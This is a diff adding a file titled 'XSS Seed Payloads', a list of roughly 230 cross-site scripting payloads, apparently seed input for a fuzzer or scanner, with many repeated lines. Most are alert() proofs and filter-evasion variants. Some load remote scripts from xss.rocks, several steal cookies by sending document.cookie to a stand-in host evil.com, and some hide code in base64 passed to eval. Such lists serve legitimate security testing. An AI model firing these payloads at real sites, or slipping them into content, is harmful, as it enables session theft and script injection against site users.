@@ -1,0 +1,233 @@
+# XSS Seed Payloads
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+javascript:alert(1)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+';alert(1);//
+"-alert(1)-
+"-confirm(1)-
+"-prompt(1)-
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(document.cookie)>
+<svg onload=alert(String.fromCharCode(88,83,83))>
+';alert(String.fromCharCode(88,83,83))//
+\";alert(1);//
+</script><script>alert(1)</script>
+<IMG SRC="javascript:alert('XSS')">
+<IMG SRC=javascript:alert('XSS')>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert('xxs')">
+<IMG onmouseover="alert('xxs')">
+<IMG SRC= onmouseover="alert('xxs')">
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<SCRIPT>document.write('<SCRI');</SCRIPT>PT>alert(1)</SCRIPT>
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+<BODY BACKGROUND="javascript:alert('XSS')">
+<BODY ONLOAD=alert('XSS')>
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+<LINK REL="stylesheet" HREF="javascript:alert('XSS')">
+<STYLE>@import'javascript:alert("XSS")';</STYLE>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS')">
+<IFRAME SRC="javascript:alert('XSS')"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert('XSS')"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<DIV ONMOUSEOVER="alert('XSS')" STYLE="width: 100px; height: 100px">
+<A HREF="javascript:alert('XSS')">CLICK</A>
+<A HREF="javascript:alert(document.cookie)">CLICK</A>
+<SCRIPT>alert(1)</SCRIPT>
+<SCRIPT>alert(1)</SCRIPT>
+<SCRIPT>alert('XSS')</SCRIPT>
+<SCRIPT>alert("XSS")</SCRIPT>
+<SCRIPT>alert(1)</SCRIPT>
+<SCRIPT>alert(1)</SCRIPT>
+<IMG SRC=x onerror=alert(1)>
+<IMG SRC=x onerror=alert('XSS')>
+<IMG SRC=x onerror=alert("XSS")>
+<IMG SRC=x onerror=alert(document.cookie)>
+<svg onload=alert(1)>
+<svg onload=alert('XSS')>
+<svg onload=alert("XSS")>
+<svg onload=alert(document.cookie)>
+<body onload=alert(1)>
+<body onload=alert('XSS')>
+<body onload=alert("XSS")>
+<input onfocus=alert(1) autofocus>
+<input onfocus=alert('XSS') autofocus>
+<details open ontoggle=alert(1)>
+<details open ontoggle=alert('XSS')>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video onerror=alert(1)><source>
+<audio onerror=alert(1)><source>
+<marquee onstart=alert(1)>
+<isindex type=image src onerror=alert(1)>
+<IMG SRC="jav ascript:alert('XSS')">
+<IMG SRC="jav&#x09;ascript:alert('XSS')">
+<IMG SRC="jav&#x0A;ascript:alert('XSS')">
+<IMG SRC="jav&#x0D;ascript:alert('XSS')">
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+<a onmouseover="alert(1)">test</a>
+<a onmouseover=alert(1)>test</a>
+<a OOnmouseover="alert(1)">test</a>
+<a onMouseOver="alert(1)">test</a>
+<IMG SRC=x onerror="alert(1)">
+<IMG SRC=x onerror="alert('XSS')">
+<SCRIPT>document.write('<SCRI');</SCRIPT>PT>alert(1)</SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT>alert(1)</SCRIPT>
+<SCRIPT a=">" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" " SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a="`" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a="'>" SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<IMG LOWSRC="javascript:alert('XSS')">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+<IMG SRC='vbscript:msgbox("XSS")'>
+<IMG SRC="mhtml:http://google.com/evil.htc">
+<BODY ONLOAD=alert('XSS')>
+<BODY ONLOAD=alert('XSS')>
+<BGSOUND SRC="javascript:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" CONTENT="<http://xss.rocks/xss.css>; REL=stylesheet">
+<IFRAME SRC="javascript:alert('XSS')"></IFRAME>
+<IFRAME SRC=javascript:alert('XSS')></IFRAME>
+<IFRAME SRC="http://xss.rocks/xss.html">
+<FRAMESET><FRAME SRC="javascript:alert('XSS')"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<DIV STYLE="background-image: url(javascript:alert('XSS'))"><DIV>
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE>BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<XSS STYLE="behavior: url(xss.htc);">
+<SCRIPT SRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPTSRC="http://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js</SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js/></SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js%20></SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
+<SCRIPT>alert(1)</SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC="jav&#x61;script:alert('XSS')">
+<IMG SRC="jav&#x61;script:alert('XSS')"</IMG>
+<IMG SRC="jav&#x61;script:alert('XSS')">
+<IMG SRC="jav&#x61;script:alert('XSS')"</IMG>
+<IMG SRC="javascript:alert('XSS')"/
+<IMG SRC="jav	ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS')" SRC="http://xss.rocks/logo.gif">
+<IMG SRC="jav	ascript:alert('XSS')">
+<IMG SRC="jav&#x09;ascript:alert('XSS')">
+<IMG SRC="jav&#x0A;ascript:alert('XSS')">
+<IMG SRC="jav&#x0D;ascript:alert('XSS')">
+<IMG SRC=" &#14;  javascript:alert('XSS')">
+<SCRIPT SRC="http://xss.rocks/xss.js"></SCRIPT>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC="javascript:alert('XSS');">
+<iframe src="javascript:alert(1)">
+<iframe src="javascript:alert('XSS')">
+<embed src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<object data="javascript:alert('XSS')">
+</object>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=1 onerror=alert(1)>
+<image src=x onerror=alert(1)>
+<image src=x onerror=alert('XSS')>
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<body onafterprint=alert(1)>
+<body onbeforeprint=alert(1)>
+<body onbeforeunload=alert(1)>
+<body onblur=alert(1)>
+<body onerror=alert(1)>
+<body onfocus=alert(1)>
+<body onhashchange=alert(1)>
+<body onload=alert(1)>
+<body onmessage=alert(1)>
+<body onoffline=alert(1)>
+<body ononline=alert(1)>
+<body onpagehide=alert(1)>
+<body onpageshow=alert(1)>
+<body onpopstate=alert(1)>
+<body onresize=alert(1)>
+<body onstorage=alert(1)>
+<body onunload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<audio><source onerror="javascript:alert(1)">
+<video onerror="javascript:alert(1)"><source>
+<audio onerror="javascript:alert(1)"><source>
+<script>alert(1)</script>
+<script>alert("XSS");</script>
+<script>alert('XSS');</script>
+<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>
+<script>new Image().src="http://evil.com/steal.php?c="+document.cookie</script>
+<script>document.write("<img src='http://evil.com/steal.php?c="+document.cookie+"'>")</script>
+<script>fetch('http://evil.com/steal.php?c='+document.cookie)</script>
+<script>navigator.sendBeacon('http://evil.com/steal.php?c='+document.cookie)</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
+<script>Function(atob('YWxlcnQoMSk='))()</script>
+<script>setTimeout(atob('YWxlcnQoMSk='),0)</script>
+<script>setInterval(atob('YWxlcnQoMSk='),1000)</script>
+</script><script>alert(1)</script>
+"></script><script>alert(1)</script>
+'><script>alert(1)</script>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<SCRIPT>alert(1)<SCRIPT>
+<SCRIPT>alert(1)</SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+</script><script>alert(1)</script>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=?<SCRIPT>alert(1)</SCRIPT>>
+<SCRIPT SRC=?<SCRIPT>alert(1)<SCRIPT>>
+<SCRIPT SRC=//xss.rocks/.l>
+<IMG SRC="javascript:alert('XSS')"<IMG SRC="javascript:alert('XSS')">
+<SCRIPT>alert(1)</SCRIPT>
+<SCRIPT>alert(1)</SCRIPT>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=javascript:alert('XSS')>
